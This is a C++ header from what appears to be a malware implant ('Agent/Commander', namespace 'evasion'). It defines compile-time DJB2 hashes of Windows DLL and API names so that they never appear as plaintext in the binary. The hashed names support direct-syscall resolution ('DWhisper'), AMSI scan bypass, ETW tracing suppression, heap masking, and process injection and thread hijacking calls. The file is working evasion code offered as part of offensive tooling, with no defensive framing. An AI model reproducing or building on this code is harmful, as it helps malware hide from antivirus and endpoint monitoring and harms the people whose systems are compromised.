// __NAME__ Agent — Compile-time DJB2 Hash + API Constants
//
// All sensitive API/module names resolved via hash — zero plaintext in binary.
// DJB2 case-insensitive variant: h = ((h << 5) + h) + tolower(c), seed 5381.

#pragma once

#include <stdint.h>

namespace evasion {

// ─── Compile-time DJB2 hash (case-insensitive) ───

constexpr char toLower(char c) {
    return (c >= 'A' && c <= 'Z') ? (c + ('a' - 'A')) : c;
}

constexpr uint32_t djb2Hash(const char* str) {
    uint32_t h = 5381;
    while (*str) {
        h = ((h << 5) + h) + static_cast<uint32_t>(toLower(*str));
        ++str;
    }
    return h;
}

// Runtime variant for comparing against export names
inline uint32_t djb2HashRuntime(const char* str) {
    uint32_t h = 5381;
    while (*str) {
        char c = *str;
        if (c >= 'A' && c <= 'Z') c += ('a' - 'A');
        h = ((h << 5) + h) + static_cast<uint32_t>(c);
        ++str;
    }
    return h;
}

// ─── Module name hashes ───

constexpr uint32_t HASH_NTDLL         = djb2Hash("ntdll.dll");
constexpr uint32_t HASH_KERNEL32      = djb2Hash("kernel32.dll");
constexpr uint32_t HASH_KERNELBASE    = djb2Hash("kernelbase.dll");
constexpr uint32_t HASH_WININET       = djb2Hash("wininet.dll");
constexpr uint32_t HASH_USER32        = djb2Hash("user32.dll");

// ─── Nt API name hashes (used for SSN table lookup) ───

constexpr uint32_t HASH_NtAllocateVirtualMemory    = djb2Hash("NtAllocateVirtualMemory");
constexpr uint32_t HASH_NtProtectVirtualMemory     = djb2Hash("NtProtectVirtualMemory");
constexpr uint32_t HASH_NtFreeVirtualMemory        = djb2Hash("NtFreeVirtualMemory");
constexpr uint32_t HASH_NtWriteVirtualMemory       = djb2Hash("NtWriteVirtualMemory");
constexpr uint32_t HASH_NtCreateThreadEx           = djb2Hash("NtCreateThreadEx");
constexpr uint32_t HASH_NtDelayExecution           = djb2Hash("NtDelayExecution");
constexpr uint32_t HASH_NtSuspendThread            = djb2Hash("NtSuspendThread");
constexpr uint32_t HASH_NtResumeThread             = djb2Hash("NtResumeThread");
constexpr uint32_t HASH_NtOpenThread               = djb2Hash("NtOpenThread");
constexpr uint32_t HASH_NtClose                    = djb2Hash("NtClose");
constexpr uint32_t HASH_NtQuerySystemInformation   = djb2Hash("NtQuerySystemInformation");
constexpr uint32_t HASH_NtQueryInformationProcess  = djb2Hash("NtQueryInformationProcess");
constexpr uint32_t HASH_NtWaitForSingleObject      = djb2Hash("NtWaitForSingleObject");
constexpr uint32_t HASH_NtReadVirtualMemory        = djb2Hash("NtReadVirtualMemory");
constexpr uint32_t HASH_NtOpenProcess               = djb2Hash("NtOpenProcess");
constexpr uint32_t HASH_NtTraceEvent                = djb2Hash("NtTraceEvent");
constexpr uint32_t HASH_NtQueryInformationProcess2  = djb2Hash("NtQueryInformationProcess");   // alias for convenience

// ─── AMSI module + function hashes ───

constexpr uint32_t HASH_AMSI_DLL                    = djb2Hash("amsi.dll");
constexpr uint32_t HASH_AmsiScanBuffer              = djb2Hash("AmsiScanBuffer");

// ─── Heap walking API hashes (kernel32, for heap masking) ───

constexpr uint32_t HASH_GetProcessHeap              = djb2Hash("GetProcessHeap");
constexpr uint32_t HASH_GetProcessHeaps             = djb2Hash("GetProcessHeaps");
constexpr uint32_t HASH_HeapWalk                    = djb2Hash("HeapWalk");
constexpr uint32_t HASH_HeapLock                    = djb2Hash("HeapLock");
constexpr uint32_t HASH_HeapUnlock                  = djb2Hash("HeapUnlock");

// ─── Additional Nt API hashes (gate-routed thread/memory/handle ops) ───

constexpr uint32_t HASH_NtQueryVirtualMemory        = djb2Hash("NtQueryVirtualMemory");
constexpr uint32_t HASH_NtTerminateProcess           = djb2Hash("NtTerminateProcess");
constexpr uint32_t HASH_NtTerminateThread            = djb2Hash("NtTerminateThread");
constexpr uint32_t HASH_NtSetContextThread           = djb2Hash("NtSetContextThread");
constexpr uint32_t HASH_NtGetContextThread           = djb2Hash("NtGetContextThread");
constexpr uint32_t HASH_NtDuplicateObject            = djb2Hash("NtDuplicateObject");
constexpr uint32_t HASH_NtUnmapViewOfSection         = djb2Hash("NtUnmapViewOfSection");
constexpr uint32_t HASH_NtOpenProcessToken           = djb2Hash("NtOpenProcessToken");
constexpr uint32_t HASH_NtQueryInformationToken      = djb2Hash("NtQueryInformationToken");

// ─── Prefix hashes for DWhisper SSN resolution ───
// "Zw" prefix — used to filter ntdll exports
// "Nt" prefix — used to convert Zw→Nt for hash-based SSN lookup

// ─── Registry API hashes (for runtime resolution) ───

constexpr uint32_t HASH_ADVAPI32              = djb2Hash("advapi32.dll");
constexpr uint32_t HASH_RegOpenKeyExA         = djb2Hash("RegOpenKeyExA");
constexpr uint32_t HASH_RegQueryValueExA      = djb2Hash("RegQueryValueExA");
constexpr uint32_t HASH_RegOpenKeyExW         = djb2Hash("RegOpenKeyExW");
constexpr uint32_t HASH_RegQueryValueExW      = djb2Hash("RegQueryValueExW");
constexpr uint32_t HASH_RegCloseKey           = djb2Hash("RegCloseKey");

// ─── Ntdll APIs resolved via PEB (Agent/Commander) ───

constexpr uint32_t HASH_RtlGetVersion                = djb2Hash("RtlGetVersion");
constexpr uint32_t HASH_NtSetInformationFile          = djb2Hash("NtSetInformationFile");

// ─── Kernel32 APIs resolved via PEB (security features) ───

constexpr uint32_t HASH_GetProcessMitigationPolicy    = djb2Hash("GetProcessMitigationPolicy");

// ─── CFG compliance (kernelbase) ───

constexpr uint32_t HASH_SetProcessValidCallTargets = djb2Hash("SetProcessValidCallTargets");

constexpr uint32_t HASH_PREFIX_ZW = djb2Hash("Zw");
constexpr uint32_t HASH_PREFIX_NT = djb2Hash("Nt");

} // namespace evasion
